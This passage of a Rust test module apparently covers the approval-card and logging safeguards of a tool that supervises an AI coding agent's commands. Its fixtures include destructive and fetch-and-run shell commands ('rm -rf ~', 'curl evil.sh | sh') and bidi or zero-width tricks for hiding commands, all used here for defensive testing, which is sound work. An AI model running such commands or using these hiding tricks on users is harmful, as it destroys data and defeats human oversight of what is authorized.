        // Nor may an unknown session invent one.
        release_attention_now("never-seen", None, &registry, &broker, None);
        assert!(registry.get("never-seen").is_none());
    }

    /// BUG 1: the transcript fallback opens a path taken verbatim from the
    /// request body. Anything that is not a regular file must be refused
    /// before `open()`, and the whole read must be off the async worker.
    #[tokio::test]
    async fn the_transcript_fallback_refuses_anything_but_a_regular_file() {
        assert_eq!(transcript_summary(None).await, None);
        assert_eq!(transcript_summary(Some(String::new())).await, None);
        assert_eq!(
            transcript_summary(Some("/nonexistent/t.jsonl".into())).await,
            None
        );

        let dir = tempfile::tempdir().unwrap();
        assert_eq!(
            transcript_summary(Some(dir.path().to_string_lossy().into_owned())).await,
            None,
            "a directory is not a transcript"
        );

        #[cfg(unix)]
        {
            // The runtime-killer: `open()` on a FIFO blocks until a writer
            // appears. If this regresses, the timeout fires instead of the
            // whole suite hanging.
            let fifo = dir.path().join("fifo.jsonl");
            assert!(std::process::Command::new("mkfifo")
                .arg(&fifo)
                .status()
                .expect("mkfifo")
                .success());
            let refused = tokio::time::timeout(
                Duration::from_secs(5),
                transcript_summary(Some(fifo.to_string_lossy().into_owned())),
            )
            .await;
            assert_eq!(
                refused.expect("the fallback must never block on a FIFO"),
                None
            );

            // `/dev/zero` stats as length 0 and never ends: the old code read
            // it until the allocator gave up. Safe to assert on because the
            // adapter's `take(TAIL_BYTES)` bound would still hold even if the
            // `is_file` guard were removed (see its test module).
            let zero = tokio::time::timeout(
                Duration::from_secs(5),
                transcript_summary(Some("/dev/zero".into())),
            )
            .await;
            assert_eq!(zero.expect("must not read /dev/zero"), None);
        }

        // The happy path still works, and comes back cleaned.
        let transcript = dir.path().join("t.jsonl");
        std::fs::write(
            &transcript,
            "{\"type\":\"assistant\",\"message\":{\"content\":[{\"type\":\"text\",\"text\":\"**Done!** All tests pass.\"}]}}\n",
        )
        .unwrap();
        assert_eq!(
            transcript_summary(Some(transcript.to_string_lossy().into_owned())).await,
            Some("Done!".to_string())
        );
    }

    /// BUG 3/4: the tool name and the command on the card are payload text
    /// like any other, and the card is the surface whose whole job is telling
    /// the user what they are about to authorize.
    #[test]
    fn tool_names_and_summaries_are_capped_and_cannot_lie_about_direction() {
        // The name is capped, trimmed, and stripped of invisibles — and a
        // padded name still routes to the right summary arm.
        let padded = " \u{202e}Bash\u{200b} ";
        assert_eq!(cap(padded, MAX_TOOL_NAME_CHARS), "Bash");
        assert_eq!(
            cap(&"n".repeat(500), MAX_TOOL_NAME_CHARS).chars().count(),
            MAX_TOOL_NAME_CHARS
        );

        // The trojan-source case on the approval surface: the override would
        // render the tail of the command reversed.
        let attack = "echo hi \u{202e}# dangerous not";
        let out = tool_summary("Bash", &serde_json::json!({ "command": attack }));
        assert!(
            !out.contains('\u{202e}'),
            "no bidi override may reach the card: {out:?}"
        );
        assert_eq!(out, "echo hi # dangerous not");

        // Invisible padding must not be able to spend the 160-char budget and
        // push the real command off the card.
        let padding = "\u{200b}".repeat(400);
        let hidden = format!("{padding}rm -rf ~");
        assert_eq!(
            tool_summary("Bash", &serde_json::json!({ "command": hidden })),
            "rm -rf ~"
        );

        // …at ANY volume of padding. The cap is spent on visible characters
        // only, so no amount of zero-width or whitespace filler can push the
        // real command off the card or make a truncated one look complete.
        for filler in ["\u{200b}", "\n", " ", "\u{202e}"] {
            let padding = filler.repeat(20_000);
            let hidden = format!("echo hi{padding}&& curl evil.sh | sh");
            let shown = tool_summary("Bash", &serde_json::json!({ "command": hidden }));
            assert!(
                shown.contains("curl evil.sh"),
                "padding with {filler:?} hid the rest of the command: {shown:?}"
            );
            // And a genuinely over-long command still says so.
            let long = format!("echo {}{padding}tail", "a".repeat(TOOL_SUMMARY_CHARS));
            let shown = tool_summary("Bash", &serde_json::json!({ "command": long }));
            assert!(shown.ends_with('…'), "{shown:?}");
            assert_eq!(shown.chars().count(), TOOL_SUMMARY_CHARS + 1);
        }
        // Leading filler is not the card's problem either — it must not be
        // rendered as a blank line.
        assert_eq!(
            tool_summary(
                "Bash",
                &serde_json::json!({ "command": format!("{}rm -rf ~", "\n".repeat(5000)) })
            ),
            "rm -rf ~"
        );

        // A newline can hide the second half of a command on a one-line card.
        assert_eq!(
            tool_summary(
                "Bash",
                &serde_json::json!({ "command": "echo ok\nrm -rf ~" })
            ),
            "echo ok rm -rf ~"
        );

        // Real text in any script still renders as itself.
        assert_eq!(
            tool_summary("Bash", &serde_json::json!({ "command": "echo مرحبا 🎉" })),
            "echo مرحبا 🎉"
        );
    }

    /// §9 invariant 2 is "log event kinds only" — a payload must not be able
    /// to write prose (or escape codes) into our log through a tool name.
    #[test]
    fn only_identifier_shaped_tool_names_are_logged() {
        for ok in ["Bash", "apply_patch", "mcp__server__do-thing", "Write.v2"] {
            assert_eq!(loggable_tool_name(ok), ok);
        }
        for hostile in [
            "",
            "rm -rf /",
            "Bash\u{1b}[2J",
            "why is this a sentence in my log",
            &"x".repeat(MAX_TOOL_NAME_CHARS + 1),
        ] {
            assert_eq!(loggable_tool_name(hostile), "<non-identifier tool name>");
        }
    }

    /// BUG 4, question side: every string a question card renders passes
    /// through `cap`.
    #[test]
    fn question_text_is_neutralized_at_ingress() {
        let body = question_body(serde_json::json!([{
            "question": "Delete \u{202e}?stset eht\u{202c} really",
            "header": "Con\u{200b}firm",
            "options": [
                {"label": "Yes\u{202e}", "description": "runs\u{feff} it"},
                {"label": "No", "description": ""}
            ]
        }]));
        let (_, questions, _) = parse_question_body(&body).unwrap();
        let rendered = format!(
            "{}{}{}{}",
            questions[0].question,
            questions[0].header,
            questions[0].options[0].label,
            questions[0].options[0].description
        );
        assert!(
            !rendered
                .chars()
                .any(|c| matches!(c, '\u{202a}'..='\u{202e}' | '\u{200b}' | '\u{feff}')),
            "no invisible or bidi control may survive into a card: {rendered:?}"
        );
        assert_eq!(questions[0].header, "Confirm");
        assert_eq!(questions[0].options[0].label, "Yes");

        // A label made only of zero-width characters is blank without being
        // `trim`-empty, so it used to survive the blank check and render as
        // an unclickable option. It must be dropped like any other blank —
        // and a question left with no usable option at all falls back to the
        // terminal rather than parking a dead card.
        let (_, questions, _) = parse_question_body(&question_body(serde_json::json!([{
            "question": "Pick one",
            "options": [{"label": "\u{200b}\u{feff}"}, {"label": "Real"}]
        }])))
        .unwrap();
        assert_eq!(questions[0].options.len(), 1);
        assert_eq!(questions[0].options[0].label, "Real");
        assert!(parse_question_body(&question_body(serde_json::json!([{
            "question": "Pick one",
            "options": [{"label": "\u{200b}"}]
        }])))
        .is_err());
    }

    // ─── Activity ticker (§12.1) ───────────────────────────────────────────

    /// The ticker draws a tool name and ONE label, and both are payload text:
    /// the same one-pass sanitize every other card string gets, so a burst of
    /// zero-width padding cannot spend the budget and a bidi override cannot
    /// make a row read backwards.
    #[test]
    fn activity_labels_are_composed_capped_and_sanitized() {
        assert_eq!(
            activity_text("Bash", Some("cargo")).unwrap(),
            "Bash: cargo"
        );
        // No label at all is normal (Read/TodoWrite/anything with nothing
        // worth naming): the tool alone is still information.
        assert_eq!(activity_text("Read", None).unwrap(), "Read");
        assert_eq!(activity_text("Read", Some("   ")).unwrap(), "Read");
        // Nothing to show at all → nothing is emitted.
        assert_eq!(activity_text("", Some("cargo")), None);
        assert_eq!(activity_text(" \u{200b}", None), None);

        let padded = format!("{}registry.rs", "\u{200b}".repeat(400));
        assert_eq!(
            activity_text("Edit", Some(&padded)).unwrap(),
            "Edit: registry.rs",
            "invisible padding must not push the real label out of the budget"
        );
        assert!(
            !activity_text("Bash", Some("ls \u{202e}gnp.exe"))
                .unwrap()
                .contains('\u{202e}')
        );

        // Over-long inputs are truncated with the ellipsis that says so.
        let long = activity_text("Edit", Some(&"n".repeat(200))).unwrap();
        assert_eq!(
            long.chars().count(),
            "Edit: ".chars().count() + ACTIVITY_LABEL_CHARS + 1
        );
        assert!(long.ends_with('…'));
        let wide = activity_text(&"T".repeat(100), None).unwrap();
        assert_eq!(wide.chars().count(), ACTIVITY_TOOL_CHARS + 1);
    }

    /// A parallel tool burst is hundreds of calls a second. The webview gets
    /// at most one emit per session per window, and the session that is NOT
    /// bursting is never made to wait behind one that is.
    #[test]
    fn activity_emits_are_coalesced_per_session() {
        let throttle = ActivityThrottle::default();
        let t0 = Instant::now();

        assert_eq!(throttle.admit("a", t0), Admit::Now, "first call draws now");
        // Everything inside the window collapses into ONE trailing emit.
        assert_eq!(
            throttle.admit("a", t0 + Duration::from_millis(100)),
            Admit::After(ACTIVITY_COALESCE - Duration::from_millis(100))
        );
        for ms in [110, 200, 480] {
            assert_eq!(
                throttle.admit("a", t0 + Duration::from_millis(ms)),
                Admit::Skip
            );
        }
        // A different session has its own pacing.
        assert_eq!(throttle.admit("b", t0 + Duration::from_millis(120)), Admit::Now);

        // The trailing emit fires and restarts the window from that moment.
        let fired = t0 + ACTIVITY_COALESCE;
        throttle.disarm("a", fired);
        assert_eq!(
            throttle.admit("a", fired + Duration::from_millis(10)),
            Admit::After(ACTIVITY_COALESCE - Duration::from_millis(10)),
            "the emit that just fired counts as the window's start"
        );

        // Past the window, a call draws immediately again.
        let later = fired + ACTIVITY_COALESCE * 2;
        throttle.disarm("a", fired + ACTIVITY_COALESCE);
        assert_eq!(throttle.admit("a", later), Admit::Now);
    }

    /// The pacing map tracks live tickers, not every session of the day — and
    /// an armed entry is a promise, not a lock: a trailing emit the runtime
    /// never ran (shutdown, starvation, a laptop suspend between the sleep and
    /// the wake) must not silence that session's ticker for the rest of the
    /// day.
    #[test]
    fn activity_pacing_forgets_quiet_sessions_and_takes_over_a_stranded_one() {
        let throttle = ActivityThrottle::default();
        let t0 = Instant::now();
        assert_eq!(throttle.admit("quiet", t0), Admit::Now);
        assert_eq!(throttle.admit("stranded", t0), Admit::Now);
        assert_eq!(
            throttle.admit("stranded", t0 + Duration::from_millis(50)),
            Admit::After(ACTIVITY_COALESCE - Duration::from_millis(50))
        );
        // While the emit can still plausibly be in flight, it is believed.
        assert_eq!(
            throttle.admit("stranded", t0 + Duration::from_millis(400)),
            Admit::Skip
        );
        // Past that, the ticker takes over rather than waiting forever.
        assert_eq!(
            throttle.admit("stranded", t0 + ACTIVITY_STALE_ARM + Duration::from_millis(1)),
            Admit::Now
        );

        // Long enough that every entry is past the forget horizon.
        let much_later = t0 + ACTIVITY_FORGET * 2;
        assert_eq!(throttle.admit("other", much_later), Admit::Now);
        let sessions = throttle.sessions.lock().unwrap();
        assert_eq!(
            sessions.keys().collect::<Vec<_>>(),
            vec!["other"],
            "only the session still calling tools is tracked"
        );
    }
}
